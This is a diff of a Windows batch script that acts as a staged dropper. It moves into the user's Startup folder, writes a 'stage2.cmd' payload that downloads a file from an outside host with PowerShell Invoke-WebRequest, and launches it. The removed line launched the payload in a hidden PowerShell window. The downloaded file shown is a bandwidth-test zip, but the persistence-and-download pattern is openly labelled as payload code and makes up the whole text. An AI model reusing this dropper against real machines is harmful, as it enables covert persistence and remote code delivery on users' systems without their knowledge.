@@ -10,12 +10,12 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd "%STARTUP%"
 
 @REM write payloads
-(
+( 
     echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'test.zip'"
-)> stage2.cmd
+) > stage2.cmd
 
 @REM run payload
-powershell Start-Process powershell.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
+start "%STARTUP%/stage2.cmd"
 
 @REM cd back to original directory
 cd "%VAR%"
